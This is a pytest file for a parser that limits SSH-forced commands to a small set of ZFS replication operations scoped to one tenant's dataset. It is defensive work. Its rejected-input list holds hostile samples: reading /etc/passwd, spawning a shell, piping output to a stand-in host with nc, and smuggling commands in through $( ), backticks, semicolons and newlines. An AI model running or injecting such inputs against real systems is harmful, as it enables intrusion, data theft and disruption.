"""Tests for turning SSH_ORIGINAL_COMMAND into allowed requests."""

from __future__ import annotations

import pytest

from zfs_tenant.grammar import Receive, Rejected, Reply, ResumeSend, Run, parse, tokenize

ROOT = "tank/friends/joe"
DS = f"{ROOT}/offsite"


def zfs(*args: str) -> Run:
    return Run("zfs", args)


ACCEPTED = [
    ("exit", Reply(0)),
    ("echo -n", Reply(0)),
    ("ps -Ao args=", Reply(0)),
    ("command -v mbuffer", Reply(1)),
    ("command -v lzop", Reply(1)),
    (
        "zpool get -o value -H feature@extensible_dataset 'tank'",
        Run("zpool", ("get", "-o", "value", "-H", "feature@extensible_dataset", "tank")),
    ),
    (f"zfs get -H name '{DS}'", zfs("get", "-H", "name", DS)),
    (f"zfs get -H receive_resume_token '{DS}'", zfs("get", "-H", "receive_resume_token", DS)),
    (f"zfs get -H -p used '{DS}'", zfs("get", "-H", "-p", "used", DS)),
    (
        f"zfs get -Hpd 1 -t snapshot guid,creation '{DS}'",
        zfs("get", "-Hpd", "1", "-t", "snapshot", "guid,creation", DS),
    ),
    (
        f"zfs get -Hpd 1 type,guid,creation '{DS}'",
        zfs("get", "-Hpd", "1", "type,guid,creation", DS),
    ),
    (f"  zfs receive  -s -F '{DS}' 2>&1", Receive(DS, resumable=True, force=True)),
    (f"  zfs receive  '{DS}' 2>&1", Receive(DS, resumable=False, force=False)),
    (f"zfs receive -u {ROOT}/x", Receive(f"{ROOT}/x", resumable=False, force=False)),
    (f"zfs receive -A '{DS}'", zfs("receive", "-A", DS)),
    (
        f" zfs destroy '{DS}'@autosnap_a,autosnap_b",
        zfs("destroy", f"{DS}@autosnap_a,autosnap_b"),
    ),
    (
        f" zfs destroy '{DS}'@syncoid_a;  zfs destroy '{DS}'@syncoid_b",
        zfs("destroy", f"{DS}@syncoid_a,syncoid_b"),
    ),
    (f"zfs destroy -r {ROOT}/old@s1", zfs("destroy", "-r", f"{ROOT}/old@s1")),
    (f"zfs destroy -r {ROOT}/old", zfs("destroy", "-r", f"{ROOT}/old")),
    (f"zfs destroy {ROOT}/old", zfs("destroy", f"{ROOT}/old")),
    (f"zfs create -p {ROOT}/a/b", zfs("create", "-p", f"{ROOT}/a/b")),
    (f"zfs create {ROOT}/a", zfs("create", f"{ROOT}/a")),
    ("zfs list", zfs("list", ROOT)),
    (
        "zfs list -Hp -r -o name,used -t snapshot",
        zfs("list", "-Hp", "-r", "-o", "name,used", "-t", "snapshot", ROOT),
    ),
    (f"zfs list -d 1 -s creation {DS}", zfs("list", "-d", "1", "-s", "creation", DS)),
    (f"zfs send -w {DS}@s2", zfs("send", "-w", f"{DS}@s2")),
    (f"zfs send -w -I @s1 {DS}@s2", zfs("send", "-w", "-I", "@s1", f"{DS}@s2")),
    (
        f"zfs send -wR -i {DS}@s1 {DS}@s2",
        zfs("send", "-wR", "-i", f"{DS}@s1", f"{DS}@s2"),
    ),
    ("zfs send -t 1-e604ea4bf-e0-789c63a2", ResumeSend("1-e604ea4bf-e0-789c63a2")),
]


@pytest.mark.parametrize(("command", "expected"), ACCEPTED)
def test_accepted(command: str, expected: object) -> None:
    assert parse(command, ROOT) == expected


REJECTED = [
    "",
    "   ",
    "sh",
    "bash -c id",
    "reboot",
    "cat /etc/passwd",
    "zfs list -r tank",
    "zfs list tank/friends",
    "zfs list tank/friends/joe2",
    "zfs get -H name tank/host",
    f"zfs get all {ROOT}",
    f"zfs get -H name {ROOT}; reboot",
    "zfs list && reboot",
    "zfs list | nc evil 1",
    "zfs list $(reboot)",
    "zfs list `reboot`",
    "zfs list\nreboot",
    "zfs list 'unbalanced",
    f"sudo zfs get -H name {ROOT}",
    f"zfs receive -F {ROOT}",
    "zfs receive tank/friends/other/x",
    "zfs receive -F tank/friends/other/x",
    f"zfs receive -F -F {DS}",
    f"zfs receive -F -A {DS}",
    f"zfs receive -o mountpoint=/etc {ROOT}/x 2>&1",
    f"zfs receive -x mountpoint {ROOT}/x",
    f"zfs receive -s -s {ROOT}/x",
    f"zfs receive {ROOT}/x 2>/tmp/f",
    f" mbuffer  -q -s 128k -m 16M | lzop -dfc |  zfs receive  -s -F '{ROOT}/x' 2>&1",
    "zfs list 2>&1",
    f"zfs destroy {ROOT}",
    f"zfs destroy -r {ROOT}",
    f"zfs destroy -f {ROOT}/x",
    f"zfs destroy -R {ROOT}/x@s",
    f"zfs destroy -d {ROOT}/x",
    f"zfs destroy -d {ROOT}/x@s",
    f"zfs destroy {ROOT}/x@%",
    f"zfs destroy {ROOT}/x@a%b",
    "zfs destroy tank/host@s",
    f"zfs destroy {ROOT}/x@s;  zfs destroy {ROOT}/y@s",
    f"zfs destroy {ROOT}/x@s; reboot",
    f"zfs destroy {ROOT}/x@-r",
    f"zfs destroy {ROOT}/x@a,,b",
    f"zfs create {ROOT}",
    f"zfs create -o mountpoint=/etc {ROOT}/x",
    f"zfs create -V 1G {ROOT}/vol",
    "zfs list -o name,mountpoint",
    "zfs list -o all",
    "zfs list -t snapshot,tank",
    "zfs list -d 1000000",
    f"zfs list -r {ROOT} tank/host",
    "zfs send tank/host@s",
    f"zfs send -w -i tank/host@s {ROOT}/x@s2",
    "zfs send -w -i @s1",
    "zfs send -t $(id)",
    f"zfs send -v {ROOT}/x@s",
    f"zfs send {ROOT}/x",
    f"zfs set quota=none {ROOT}",
    f"zfs allow -u joe quota {ROOT}",
    f"zfs rename {ROOT}/x tank/x",
    "zpool get -o value -H feature@extensible_dataset other",
    "zpool list",
    "command -v 'mbuffer; reboot'",
    "ps aux",
]


@pytest.mark.parametrize("command", REJECTED)
def test_rejected(command: str) -> None:
    assert isinstance(parse(command, ROOT), Rejected)


def test_sudo_reason_points_at_no_privilege_elevation() -> None:
    result = parse(f"sudo zfs get -H name {ROOT}", ROOT)
    assert isinstance(result, Rejected)
    assert "--no-privilege-elevation" in result.reason


def test_outside_reason_names_the_root() -> None:
    result = parse("zfs get -H name tank/host", ROOT)
    assert isinstance(result, Rejected)
    assert ROOT in result.reason


def test_tokenize_resolves_syncoid_quoting() -> None:
    assert tokenize(f"  zfs receive  -s -F '{DS}' 2>&1") == [
        "zfs",
        "receive",
        "-s",
        "-F",
        DS,
        "2",
        ">&",
        "1",
    ]


def test_tokenize_refuses_control_characters_and_bad_quotes() -> None:
    assert tokenize("zfs list\nreboot") is None
    assert tokenize("zfs list 'x") is None
